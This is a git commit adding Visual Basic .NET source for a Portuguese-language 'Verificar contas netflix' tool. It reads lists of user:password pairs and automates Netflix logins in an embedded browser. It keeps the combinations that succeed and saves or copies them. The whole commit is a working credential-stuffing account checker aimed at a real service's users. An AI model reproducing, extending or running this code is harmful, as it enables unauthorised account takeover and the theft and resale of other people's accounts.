7bede5cdfc5e78d19d819ae366e1c07b981e6bda
gusdnide <gusdnide99@hotmail.com>
2015-08-25 15:09:31 -0300

    dfsdfd
    sfsdfsd

---
+++ Form1.Designer.vb
@@ -0,0 +1,244 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
+Partial Class Form1
+    Inherits System.Windows.Forms.Form
+
+    'Form overrides dispose to clean up the component list.
+    <System.Diagnostics.DebuggerNonUserCode()> _
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Required by the Windows Form Designer
+    Private components As System.ComponentModel.IContainer
+
+    'NOTE: The following procedure is required by the Windows Form Designer
+    'It can be modified using the Windows Form Designer.  
+    'Do not modify it using the code editor.
+    <System.Diagnostics.DebuggerStepThrough()> _
+    Private Sub InitializeComponent()
+        Me.components = New System.ComponentModel.Container()
+        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
+        Me.Button1 = New System.Windows.Forms.Button()
+        Me.PictureBox1 = New System.Windows.Forms.PictureBox()
+        Me.GroupBox1 = New System.Windows.Forms.GroupBox()
+        Me.Button2 = New System.Windows.Forms.Button()
+        Me.Label1 = New System.Windows.Forms.Label()
+        Me.ListBox1 = New System.Windows.Forms.ListBox()
+        Me.ListBox2 = New System.Windows.Forms.ListBox()
+        Me.ContextMenuStrip1 = New System.Windows.Forms.ContextMenuStrip(Me.components)
+        Me.SalvarListaToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
+        Me.CopiarToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
+        Me.UsuarioToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
+        Me.SenhaToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
+        Me.UsuarioSenhaToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
+        Me.AdicionarAListaToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
+        Me.Label2 = New System.Windows.Forms.Label()
+        Me.Label3 = New System.Windows.Forms.Label()
+        Me.WebBrowser1 = New System.Windows.Forms.WebBrowser()
+        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
+        Me.Timer2 = New System.Windows.Forms.Timer(Me.components)
+        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
+        Me.GroupBox1.SuspendLayout()
+        Me.ContextMenuStrip1.SuspendLayout()
+        Me.SuspendLayout()
+        '
+        'Button1
+        '
+        Me.Button1.Location = New System.Drawing.Point(6, 19)
+        Me.Button1.Name = "Button1"
+        Me.Button1.Size = New System.Drawing.Size(118, 28)
+        Me.Button1.TabIndex = 0
+        Me.Button1.Text = "Carregar Lista"
+        Me.Button1.UseVisualStyleBackColor = True
+        '
+        'PictureBox1
+        '
+        Me.PictureBox1.Image = Global.Verificar_Contas.My.Resources.Resources.ToNemAe
+        Me.PictureBox1.Location = New System.Drawing.Point(12, 122)
+        Me.PictureBox1.Name = "PictureBox1"
+        Me.PictureBox1.Size = New System.Drawing.Size(158, 145)
+        Me.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
+        Me.PictureBox1.TabIndex = 1
+        Me.PictureBox1.TabStop = False
+        '
+        'GroupBox1
+        '
+        Me.GroupBox1.Controls.Add(Me.Button2)
+        Me.GroupBox1.Controls.Add(Me.Label1)
+        Me.GroupBox1.Controls.Add(Me.Button1)
+        Me.GroupBox1.Enabled = False
+        Me.GroupBox1.Location = New System.Drawing.Point(194, 12)
+        Me.GroupBox1.Name = "GroupBox1"
+        Me.GroupBox1.Size = New System.Drawing.Size(382, 81)
+        Me.GroupBox1.TabIndex = 2
+        Me.GroupBox1.TabStop = False
+        '
+        'Button2
+        '
+        Me.Button2.Location = New System.Drawing.Point(201, 19)
+        Me.Button2.Name = "Button2"
+        Me.Button2.Size = New System.Drawing.Size(118, 28)
+        Me.Button2.TabIndex = 4
+        Me.Button2.Text = "Iniciar"
+        Me.Button2.UseVisualStyleBackColor = True
+        '
+        'Label1
+        '
+        Me.Label1.AutoSize = True
+        Me.Label1.Location = New System.Drawing.Point(7, 58)
+        Me.Label1.Name = "Label1"
+        Me.Label1.Size = New System.Drawing.Size(211, 13)
+        Me.Label1.TabIndex = 3
+        Me.Label1.Text = "Status:  Aguarde a conexao com o servidor"
+        '
+        'ListBox1
+        '
+        Me.ListBox1.FormattingEnabled = True
+        Me.ListBox1.Location = New System.Drawing.Point(194, 112)
+        Me.ListBox1.Name = "ListBox1"
+        Me.ListBox1.Size = New System.Drawing.Size(168, 212)
+        Me.ListBox1.TabIndex = 3
+        '
+        'ListBox2
+        '
+        Me.ListBox2.ContextMenuStrip = Me.ContextMenuStrip1
+        Me.ListBox2.FormattingEnabled = True
+        Me.ListBox2.Location = New System.Drawing.Point(395, 112)
+        Me.ListBox2.Name = "ListBox2"
+        Me.ListBox2.ScrollAlwaysVisible = True
+        Me.ListBox2.Size = New System.Drawing.Size(188, 212)
+        Me.ListBox2.TabIndex = 4
+        '
+        'ContextMenuStrip1
+        '
+        Me.ContextMenuStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.SalvarListaToolStripMenuItem, Me.CopiarToolStripMenuItem, Me.AdicionarAListaToolStripMenuItem})
+        Me.ContextMenuStrip1.Name = "ContextMenuStrip1"
+        Me.ContextMenuStrip1.Size = New System.Drawing.Size(162, 70)
+        '
+        'SalvarListaToolStripMenuItem
+        '
+        Me.SalvarListaToolStripMenuItem.Name = "SalvarListaToolStripMenuItem"
+        Me.SalvarListaToolStripMenuItem.Size = New System.Drawing.Size(161, 22)
+        Me.SalvarListaToolStripMenuItem.Text = "Dumpar Lista"
+        '
+        'CopiarToolStripMenuItem
+        '
+        Me.CopiarToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.UsuarioToolStripMenuItem, Me.SenhaToolStripMenuItem, Me.UsuarioSenhaToolStripMenuItem})
+        Me.CopiarToolStripMenuItem.Name = "CopiarToolStripMenuItem"
+        Me.CopiarToolStripMenuItem.Size = New System.Drawing.Size(161, 22)
+        Me.CopiarToolStripMenuItem.Text = "Copiar "
+        '
+        'UsuarioToolStripMenuItem
+        '
+        Me.UsuarioToolStripMenuItem.Name = "UsuarioToolStripMenuItem"
+        Me.UsuarioToolStripMenuItem.Size = New System.Drawing.Size(149, 22)
+        Me.UsuarioToolStripMenuItem.Text = "Usuario"
+        '
+        'SenhaToolStripMenuItem
+        '
+        Me.SenhaToolStripMenuItem.Name = "SenhaToolStripMenuItem"
+        Me.SenhaToolStripMenuItem.Size = New System.Drawing.Size(149, 22)
+        Me.SenhaToolStripMenuItem.Text = "Senha"
+        '
+        'UsuarioSenhaToolStripMenuItem
+        '
+        Me.UsuarioSenhaToolStripMenuItem.Name = "UsuarioSenhaToolStripMenuItem"
+        Me.UsuarioSenhaToolStripMenuItem.Size = New System.Drawing.Size(149, 22)
+        Me.UsuarioSenhaToolStripMenuItem.Text = "Usuario:Senha"
+        '
+        'AdicionarAListaToolStripMenuItem
+        '
+        Me.AdicionarAListaToolStripMenuItem.Name = "AdicionarAListaToolStripMenuItem"
+        Me.AdicionarAListaToolStripMenuItem.Size = New System.Drawing.Size(161, 22)
+        Me.AdicionarAListaToolStripMenuItem.Text = "Adicionar a Lista"
+        '
+        'Label2
+        '
+        Me.Label2.AutoSize = True
+        Me.Label2.Location = New System.Drawing.Point(243, 96)
+        Me.Label2.Name = "Label2"
+        Me.Label2.Size = New System.Drawing.Size(32, 13)
+        Me.Label2.TabIndex = 6
+        Me.Label2.Text = "Lista:"
+        '
+        'Label3
+        '
+        Me.Label3.AutoSize = True
+        Me.Label3.Location = New System.Drawing.Point(457, 96)
+        Me.Label3.Name = "Label3"
+        Me.Label3.Size = New System.Drawing.Size(56, 13)
+        Me.Label3.TabIndex = 6
+        Me.Label3.Text = "Funcional:"
+        '
+        'WebBrowser1
+        '
+        Me.WebBrowser1.Location = New System.Drawing.Point(627, 12)
+        Me.WebBrowser1.MinimumSize = New System.Drawing.Size(20, 20)
+        Me.WebBrowser1.Name = "WebBrowser1"
+        Me.WebBrowser1.ScriptErrorsSuppressed = True
+        Me.WebBrowser1.Size = New System.Drawing.Size(436, 288)
+        Me.WebBrowser1.TabIndex = 7
+        Me.WebBrowser1.Url = New System.Uri("https://www.netflix.com/Login?locale=pt-BR", System.UriKind.Absolute)
+        '
+        'Timer1
+        '
+        Me.Timer1.Interval = 5000
+        '
+        'Timer2
+        '
+        Me.Timer2.Interval = 5000
+        '
+        'Form1
+        '
+        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
+        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+        Me.ClientSize = New System.Drawing.Size(609, 363)
+        Me.Controls.Add(Me.WebBrowser1)
+        Me.Controls.Add(Me.Label3)
+        Me.Controls.Add(Me.Label2)
+        Me.Controls.Add(Me.ListBox2)
+        Me.Controls.Add(Me.ListBox1)
+        Me.Controls.Add(Me.GroupBox1)
+        Me.Controls.Add(Me.PictureBox1)
+        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedDialog
+        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
+        Me.MaximizeBox = False
+        Me.MinimizeBox = False
+        Me.Name = "Form1"
+        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
+        Me.Text = "Verificar contas netflix"
+        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
+        Me.GroupBox1.ResumeLayout(False)
+        Me.GroupBox1.PerformLayout()
+        Me.ContextMenuStrip1.ResumeLayout(False)
+        Me.ResumeLayout(False)
+        Me.PerformLayout()
+
+    End Sub
+    Friend WithEvents Button1 As System.Windows.Forms.Button
+    Friend WithEvents PictureBox1 As System.Windows.Forms.PictureBox
+    Friend WithEvents GroupBox1 As System.Windows.Forms.GroupBox
+    Friend WithEvents Button2 As System.Windows.Forms.Button
+    Friend WithEvents Label1 As System.Windows.Forms.Label
+    Friend WithEvents ListBox1 As System.Windows.Forms.ListBox
+    Friend WithEvents ListBox2 As System.Windows.Forms.ListBox
+    Friend WithEvents Label2 As System.Windows.Forms.Label
+    Friend WithEvents Label3 As System.Windows.Forms.Label
+    Friend WithEvents WebBrowser1 As System.Windows.Forms.WebBrowser
+    Friend WithEvents Timer1 As System.Windows.Forms.Timer
+    Friend WithEvents Timer2 As System.Windows.Forms.Timer
+    Friend WithEvents ContextMenuStrip1 As System.Windows.Forms.ContextMenuStrip
+    Friend WithEvents SalvarListaToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
+    Friend WithEvents CopiarToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
+    Friend WithEvents UsuarioToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
+    Friend WithEvents SenhaToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
+    Friend WithEvents UsuarioSenhaToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
+    Friend WithEvents AdicionarAListaToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
+
+End Class
---
+++ Form1.vb
@@ -0,0 +1,208 @@
+﻿Imports System.IO
+Public Class Form1
+    Public Structure Conta
+        Public Usuario As String
+        Public Senha As String
+    End Structure
+    Public Contas(25000) As Conta
+    Public Verificando As Boolean = False
+    Public Quntos As Integer = 0
+    Public CurrentIndex As Integer = 0
+    Sub DumparLista(ByVal Lista As ListBox)
+        Dim local As String = Application.StartupPath + "\Dump.txt"
+        Dim Linhas(Lista.Items.Count) As String
+        Dim Index As Integer = 0
+        For Each dd As String In Lista.Items
+            Dim tCnt As Conta = ProcurarConta(dd)
+            Linhas(Index) = tCnt.Usuario + ":" + tCnt.Senha
+            Index = Index + 1
+        Next
+        File.WriteAllLines(local, Linhas)
+    End Sub
+    Function ProcurarConta(ByVal Usuario As String) As Conta
+        Dim Max As Integer = Contas.Length
+        For Each Cnt As Conta In Contas
+            If (Cnt.Usuario = Usuario) Then
+                Return Cnt
+            End If
+        Next
+        MsgBox("Não foi possivel encontrar esta conta", "ERROR")
+        Dim Conta2 As New Conta
+        Return Conta2
+    End Function
+    Sub CarregarContas(ByVal Local As String)
+        Dim Linhas As String()
+        Linhas = File.ReadAllLines(Local)
+        Dim Quantidade As Integer = 0
+        For Each Linha As String In Linhas
+            If (Verificar(Linha) = True) Then
+                Contas(Quantidade) = New Conta()
+                Contas(Quantidade) = RetornaConta(Linha)
+                ListBox1.Items.Add(RetornaConta(Linha).Usuario)
+                Quntos = Quantidade
+                Quantidade = Quantidade + 1
+            End If
+
+        Next
+    End Sub
+    Public Function Verificar(ByVal str As String) As Boolean
+        Dim Resultado As Boolean = False
+        Dim index As Integer = str.IndexOf(":")
+        If (index >= 0) Then
+            If (str(index + 1) = "") Then
+            Else
+
+                Resultado = True
+            End If
+        End If
+        Return Resultado
+    End Function
+    Public Function RetornaConta(ByVal str As String) As Conta
+        Dim cnt As New Conta
+        Dim index As Integer = str.IndexOf(":")
+        Dim user As String = str.Substring(0, index)
+        Dim senha As String = str.Substring(index + 1, str.Length - index - 1)
+        cnt.Senha = senha
+        cnt.Usuario = user
+        Return cnt
+    End Function
+    Public Sub Logar(ByVal Usuario As String, ByVal Senha As String)
+        WebBrowser1.Document.GetElementById("password").SetAttribute("value", Senha)
+        WebBrowser1.Document.GetElementById("email").SetAttribute("value", Usuario)
+        WebBrowser1.Document.GetElementById("login-form-contBtn").InvokeMember("click")
+    End Sub
+    Sub AdicionarNaLista(ByVal Index As Integer)
+        ListBox2.Items.Add(Contas(Index).Usuario)
+
+    End Sub
+    Private Sub WebBrowser1_DocumentCompleted(ByVal sender As Object, ByVal e As WebBrowserDocumentCompletedEventArgs) Handles WebBrowser1.DocumentCompleted
+        If (GroupBox1.Enabled = False) Then
+            If (WebBrowser1.DocumentText.Contains("Entrar")) Then
+                Label1.ForeColor = Color.Green
+                Label1.Text = "Status: Conexão OK!"
+                GroupBox1.Enabled = True
+            End If
+        End If
+        If (Verificando = True) Then
+            If (WebBrowser1.DocumentText.Contains("As informações de login inseridas não correspondem a uma conta em nossos registros") = True) Then
+                'Senha incorreta :)
+                CurrentIndex = CurrentIndex + 1
+            Else
+                AdicionarNaLista(CurrentIndex)
+                WebBrowser1.Navigate("http://www.netflix.com/SignOut?lnkctr=mL")
+                CurrentIndex = CurrentIndex + 1
+            End If
+            Verificando = False
+        End If
+
+    End Sub
+    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
+        Label1.Text = "Status: Verificando conta: " + Contas(CurrentIndex).Usuario
+        If (CurrentIndex <= Quntos) Then
+            If (Verificando = False) Then
+                If (WebBrowser1.DocumentText.Contains("Lembrar de mim neste computador") = True) Then
+                    ListBox1.SelectedIndex = CurrentIndex
+                    Logar(Contas(CurrentIndex).Usuario, Contas(CurrentIndex).Senha)
+                    Verificando = True
+                End If
+         
+            End If
+        Else
+            Button2.Enabled = True
+            Timer1.Stop()
+            Label1.Text = "Status: Concluido"
+        End If
+      
+    End Sub
+    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
+        Dim opf As New OpenFileDialog
+        opf.Filter = "Arquivos de Texto (*.txt)|*.txt"
+        If (opf.ShowDialog = Windows.Forms.DialogResult.OK) Then
+            CarregarContas(opf.FileName)
+        End If
+    End Sub
+    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
+        Timer1.Start()
+        Button2.Enabled = False
+    End Sub
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        Timer2.Start()
+    End Sub
+    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
+        Dim z As String = "Please upgrade your browser to continue using"
+        If (WebBrowser1.DocumentText.Contains(z) = True) Then
+            WebBrowser1.Navigate("http://www.netflix.com/SignOut?lnkctr=mL")
+        End If
+        If (WebBrowser1.DocumentText.Contains("Este sitio utiliza tecnología de") = True) Then
+            WebBrowser1.Navigate("http://www.netflix.com/SignOut?lnkctr=mL")
+        End If
+        If (WebBrowser1.DocumentText.Contains("profilesGateWrapper") = True) Then
+            WebBrowser1.Navigate("http://www.netflix.com/SignOut?lnkctr=mL")
+        End If
+        If (WebBrowser1.DocumentText.Contains("Finalize sua inscrição") = True) Then
+            WebBrowser1.Navigate("http://www.netflix.com/SignOut?lnkctr=mL")
+        End If
+        If (WebBrowser1.DocumentText.Contains("Sessão encerrada") = True) Then
+            WebBrowser1.Navigate("https://www.netflix.com/Login?locale=pt-BR")
+        End If
+    End Sub
+    Private Sub UsuarioToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UsuarioToolStripMenuItem.Click
+        If (ListBox2.SelectedIndex > -1) Then
+            Dim Conta2 As Conta = ProcurarConta(ListBox2.SelectedItem)
+            Clipboard.SetText(Conta2.Usuario)
+            MsgBox("Copiado")
+        End If
+
+    End Sub
+    Private Sub SalvarListaToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SalvarListaToolStripMenuItem.Click
+        DumparLista(ListBox2)
+    End Sub
+    Private Sub SenhaToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SenhaToolStripMenuItem.Click
+        If (ListBox2.SelectedIndex > -1) Then
+            Dim Conta2 As Conta = ProcurarConta(ListBox2.SelectedItem)
+            Clipboard.SetText(Conta2.Senha)
+            MsgBox("Copiado")
+        End If
+    End Sub
+    Private Sub UsuarioSenhaToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UsuarioSenhaToolStripMenuItem.Click
+        If (ListBox2.SelectedIndex > -1) Then
+            Dim Conta2 As Conta = ProcurarConta(ListBox2.SelectedItem)
+            Clipboard.SetText(Conta2.Usuario + ":" + Conta2.Senha)
+            MsgBox("Copiado")
+        End If
+    End Sub
+
+    Private Sub AdicionarAListaToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AdicionarAListaToolStripMenuItem.Click
+        Dim Lista As ListBox = ListBox2
+        Dim local As String = Application.StartupPath + "\Lista.txt"
+        Dim Linhas(50000) As String
+        Dim Index As Integer = 0
+        For Each dd As String In Lista.Items
+            Dim tCnt As Conta = ProcurarConta(dd)
+            Linhas(Index) = tCnt.Usuario + ":" + tCnt.Senha
+            Index = Index + 1
+        Next
+        Index = Index
+        Try
+            Dim LinhasAntiga() As String = File.ReadAllLines(local)
+            If (Linhas.Count > 0) Then
+                Dim t As New ListBox
+                t.Items.AddRange(LinhasAntiga)
+                For Each Ss As String In t.Items
+                    Linhas(Index) = Ss
+                    Index = Index + 1
+                Next
+            End If
+        Catch ex As Exception
+
+        End Try
+        Dim retorno(Linhas.Count) As String
+        Dim gf As Integer = 0
+        For Each i As String In Linhas
+            retorno(gf) = i
+            gf = gf + 1
+        Next
+        
+        File.WriteAllLines(local, retorno)
+    End Sub
+End Class
